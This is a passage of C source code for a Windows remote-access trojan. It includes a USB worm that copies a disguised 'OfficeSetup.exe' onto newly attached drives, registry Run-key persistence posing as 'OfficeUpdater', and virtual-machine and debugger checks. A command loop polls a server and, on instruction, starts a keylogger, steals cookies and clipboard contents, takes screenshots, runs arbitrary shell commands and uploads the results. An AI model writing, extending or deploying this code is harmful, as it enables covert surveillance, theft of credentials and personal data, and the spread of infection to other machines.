				//grab the file from the path
				FILE* file;
				errno_t err = _wfopen_s(&file, concatenatedPath, L"r");
				//send the file to the server
				http_post(concatenatedPath, id);
				FindClose(hFind);
			}
		}
	}
	// Free memory
	free(usernames);
}

BOOL USBWorm() {
	char drives[256]; // Buffer for storing drive strings
	char previousDrives[256];
	DWORD fileSystemLen = 0;
	DWORD previousFileSystemLen = 0;
	char destination[MAX_PATH];
	char source[MAX_PATH];

	// Get the initial list of logical drive strings
	fileSystemLen = GetLogicalDriveStringsA(sizeof(drives), drives);
	if (fileSystemLen == 0) {
		MessageBoxA(NULL, "Error getting drive information.", "Error", MB_ICONERROR);
		return FALSE;
	}

	// Copy the initial drive list to the previousDrives array
	memcpy(previousDrives, drives, fileSystemLen);
	previousFileSystemLen = fileSystemLen;

	while (1) {
		fileSystemLen = GetLogicalDriveStringsA(sizeof(drives), drives);
		if (fileSystemLen == 0) {
			// MessageBoxA(NULL, "Error getting drive information.", "Error", MB_ICONERROR);
			return FALSE;
		}

		// Check for added drives
		for (int i = 0; i < fileSystemLen; i += 4) {
			int found = 0;
			for (int j = 0; j < previousFileSystemLen; j += 4) {
				if (strncmp(&drives[i], &previousDrives[j], 4) == 0) {
					found = 1;
					break;
				}
			}
			if (!found) {
				//MessageBoxA(NULL, "Drive Added.", "Info", MB_ICONINFORMATION);

				sprintf_s(destination, sizeof(destination), "%c:\\OfficeSetup.exe", drives[i]);//change the file name to the file you want to copy AKA the malware
				wchar_t* tempPath = NULL;
				size_t convertedChars = 0;

				// Get the temporary folder path
				if (SUCCEEDED(SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &tempPath))) {
					// Convert wide char path to narrow char path
					wcstombs_s(&convertedChars, source, MAX_PATH, tempPath, _TRUNCATE);

					// Append the file name to the temp path
				   // StringCchCatW(source, MAX_PATH, "\\Temp\\Readme.txt");
					sprintf_s(source, sizeof(source), "%s\\Temp\\OfficeSetup.exe", source);//change the file name to the file you want to copy AKA the malware
					// Use the path stored in source
					printf("Temporary file path: %s\n", source);

					// Free the memory allocated by SHGetKnownFolderPath
					CoTaskMemFree(tempPath);
					FILE* worm, * copy;
					errno_t errWorm = fopen_s(&worm, source, "rb");
					errno_t errCopy = fopen_s(&copy, destination, "wb");

					if (errWorm != 0 || errCopy != 0 || worm == NULL || copy == NULL) {
						//MessageBoxA(NULL, "Error opening files.", "Error", MB_ICONERROR);
						return FALSE;
					}

					char buffer[1024];
					size_t bytesRead;
					while ((bytesRead = fread(buffer, 1, sizeof(buffer), worm)) > 0) {
						fwrite(buffer, 1, bytesRead, copy);
					}

					fclose(worm);
					fclose(copy);
				}
				else {
					// Handle error
					printf("Failed to get the temporary folder path.\n");
				}
				;
			}
		}

		// Check for removed drives
		for (int i = 0; i < previousFileSystemLen; i += 4) {
			int found = 0;
			for (int j = 0; j < fileSystemLen; j += 4) {
				if (strncmp(&previousDrives[i], &drives[j], 4) == 0) {
					found = 1;
					break;
				}
			}
			if (!found) {
				//MessageBoxA(NULL, "Drive Removed.", "Info", MB_ICONINFORMATION);
			}
		}

		// Update the previous drive list
		memcpy(previousDrives, drives, fileSystemLen);
		previousFileSystemLen = fileSystemLen;
	}
	return TRUE;
}

int persistance()
{
	//char err[128] = "Failed\n";
	//char succ[128] = "Created persistence at : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szpath[MAX_PATH];
	DWORD pathlen = 0;

	pathlen = GetModuleFileName(NULL, szpath, MAX_PATH);

	if (pathlen == 0)
	{
		ErrorExit(_TEXT("GetModuleFileName"));
		return -1;
	}

	HKEY NewVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
	{
		ErrorExit(_TEXT("RegOpenKey"));
		return -1;
	}
	DWORD pathLenInBytes = pathlen * sizeof(*szpath);

	if (RegSetValueEx(NewVal, TEXT("OfficeUpdater"), 0, REG_SZ, (LPBYTE)szpath, pathLenInBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(NewVal);
		ErrorExit(_TEXT("RegSetValueEx"));

		return -1;
	}
	RegCloseKey(NewVal);
	printf("Created persistence at : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n");

	return 0;
}

int main() {
	int i;
	unsigned long long avg = 0;
	for (i = 0; i < 10; i++) {
		avg = avg + rdtsc();
		Sleep(500);
	}
	avg = avg / 10;
	if (avg < 700 && avg > 0)
		printf("This is not a VM\n");
	else {
		printf("this is a VM\n");
		//return EXIT_FAILURE;
	}

	char mac_addr[18];
	get_mac_address(mac_addr);

	if (cpuid_check() || debugger_present() || is_vm_mac(mac_addr)) {
		//return EXIT_FAILURE;
	}

	else {
		printf("The system is not running inside a VirtualBox.\n");
	}

	size_t FileBuffer_SIZE = 4096;
	LPSTR pszOutBuffer;
	int responseValue = 0;
	char* cmd;
	int bKeylogTHREAD = 0;
	int bUSBWormTHREAD = 0;
	HANDLE hKeylogThread = NULL;
	HANDLE hUSBThread = NULL;
	GenerateID(id);

	//make the temp dir to store files and also check if there is an id.txt so we get the old id back to continue
	//the exfiltration
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata))) {
		if (!create_hidden_folder(local_appdata, L"patch")) {
			printf("patch folder created\n");
			swprintf(patch_folder, MAX_PATH, L"%s\\%s", local_appdata, L"patch");//get the folder path
			swprintf(patch_folder, MAX_PATH, L"%s\\%s\\id.txt", local_appdata, L"patch");// add this file to the path to save the id in it
			wprintf_s(patch_folder);
			wprintf_s(L"\n");
			SaveIDFile(patch_folder, (LPVOID)id, sizeof(id));
		}
		else {
			if (create_hidden_folder(local_appdata, L"patch") == 2) {
				printf("patch folder already exists\n");
				swprintf(patch_folder, MAX_PATH, L"%s\\%s", local_appdata, L"patch");
				ReadIdFromFile(patch_folder, id);
				wprintf(id);
			}
			//can make a loop here to try to create it
		}
	}

	///////////////////////////////////important filepaths///////////////////////////////////////

	swprintf(screenshotFile, 260, L"%s\\photo.bmp", patch_folder);
	swprintf(keyloggerFile, 260, L"%s\\keylogger.txt", patch_folder);

	// Convert patch folder wchar_t* to char* by making a seperate buffer for the narrow char
	size_t convertedChars = 0;
	size_t bufferSize = wcslen(patch_folder) + 1;
	char* narrow_patch_folder = (char*)malloc(bufferSize);
	wcstombs_s(&convertedChars, narrow_patch_folder, bufferSize, patch_folder, _TRUNCATE);

	// Construct clipboardFile path (narrow char)
	snprintf(clipboardFile, sizeof(clipboardFile), "%s\\clipboard.txt", narrow_patch_folder);

	// Convert clipboardFile to wide char
	swprintf(clipboardFile_wide, 260, L"%s\\clipboard.txt", patch_folder);

	///////////////////////////////////////////////////////////////////////////////////

	//resgister the user to the server
	while (!http_post(NULL, id))
		Sleep(3000);

	// Check if response starts with "3:"
	while (1) {
		printf("Checking\n");
		http_post(NULL, id); // pinging alive maybe add a timer or a loop
		Sleep(3000);
		pszOutBuffer = http_get(id);
		// Receive and process commands
		if (strncmp(pszOutBuffer, "3:", 2) == 0) {
			// Set responseValue to the integer part after "3:"
			responseValue = 3;
			cmd = pszOutBuffer + 2; // Skip "3:"
		}
		else {
			responseValue = atoi(pszOutBuffer);
			cmd = NULL;
		}

		switch (responseValue) { // Convert the received buffer to an integer
		case 1:
			printf("Received: 1\n");
			//send_result = send(clientSocket, userInput, (int)strlen(userInput), 0);
			if (!bKeylogTHREAD) { //only one thread of keylogging should run!
				hKeylogThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keylog, NULL, 0, NULL);//try to start the thread
				if (hKeylogThread == NULL) {//actually running?
					printf("Failed to create keylog thread.\n");
					break;
				}
				else
				{
					bKeylogTHREAD = 1;//okay running and nothing else will run
					printf("keylogger thread started!.\n");

					break;
				}
				break;
			}

			break;
		case 2:
			printf("Received: 2\n");
			//steal cookies
			stealCookies();
			break;

		case 3:

			printf("Received: 3\n");
			//RCE
			//split by delimiter
			HANDLE hFile = CreateFileW(
				L"Outputcmd.txt",
				GENERIC_READ | GENERIC_WRITE,
				0,
				NULL,
				CREATE_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);

			if (hFile == INVALID_HANDLE_VALUE) {
				fprintf(stderr, "Error creating file Output.txt\n");
				ErrorExit(_TEXT("CreateFileW"));
			}

			// Close the handle as we won't be using it directly in this example
			CloseHandle(hFile);

			//int systemResult = system("dir > Outputt.txt");
			int systemResult = system(cmd);

			if (systemResult != 0) {
				fprintf(stderr, "Error running system command: %d\n", systemResult);
				return -1;
			}

			printf("Command executed successfully. Output saved to Output.txt\n");
			http_post(L"Outputcmd.txt", id);
			// Delete Output.txt file
			if (!DeleteFileW(L"Outputcmd.txt")) {
				fprintf(stderr, "Error deleting file Output.txt. Error code: %lu\n", GetLastError());
			}
			else {
				printf("Output.txt deleted successfully.\n");
			}
			break;
		case 4:
			printf("Received: 4\n");
			//do presistence
			persistance();
			break;

		case 5:
			printf("Received: 5\n");
			//screenshots

			TakeAndSaveScreenshot(patch_folder);
			http_post(screenshotFile, id);
			printf("Screenshot sent, sleeping....\n");
			Sleep(3000);
			break;

		case 6:
			printf("Received: 6\n");
			//clipboard
			stealClipboardAndSaveToFile(clipboardFile);
			http_post(clipboardFile_wide, id);
			break;

		case 7:
			printf("Received: 7\n");
			//delete the malware
			deleteSelf();
			break;

		case 8:
			// Disable keylogger
			if (bKeylogTHREAD) {
				// Terminate the keylogger thread
				if (TerminateThread(hKeylogThread, 0)) {
					printf("Keylogger thread terminated.\n");
					bKeylogTHREAD = 0; // Reset the flag
				}
				else {
					ErrorExit(_TEXT("TerminateThread"));
					printf("Failed to terminate keylogger thread.\n");
				}
			}
			else {
				printf("Keylogger thread is not running.\n");
			}
			break;
		case 9:
			//enable USBWorm

			if (!bUSBWormTHREAD) { //only one thread of USBWorm should run!
				hUSBThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)USBWorm, NULL, NULL, NULL);//try to start the thread
				if (hUSBThread == NULL) {//actually running?
					printf("Failed to create USBWorm thread.\n");
					break;
				}
				else
				{
					bUSBWormTHREAD = 1;//okay running and nothing else will run
					printf("USBWorm thread started!.\n");
					break;
				}
				break;
			}
			break;
		case 10:
			//disable USBWorm
			if (bUSBWormTHREAD) {
				// Terminate the USBWorm thread
				if (TerminateThread(hUSBThread, 0)) {
					printf("USBWorm thread terminated.\n");
					bUSBWormTHREAD = 0; // Reset the flag
				}
				else {
					ErrorExit(_TEXT("TerminateThread"));
					printf("Failed to terminate USBWorm thread.\n");
				}
			}
			else {
				printf("USBWorm thread is not running.\n");
			}
			break;

		case 11:
			http_post(keyloggerFile, id); //steals keylogs for now
			printf("\n");
			wprintf(keyloggerFile);
			//Sleep(30000);
			break;

		default:
			printf("Received something else\n");
			break;
		}

		printf("full response : %s\n", pszOutBuffer);
		printf("response code parsed : %d\n", responseValue);
		printf("parsed cmd : %s\n", cmd);

		Sleep(3000); //Sleep(300000); // Sleep for 5 minutes in pratical case
	}

	return WN_SUCCESS;
}
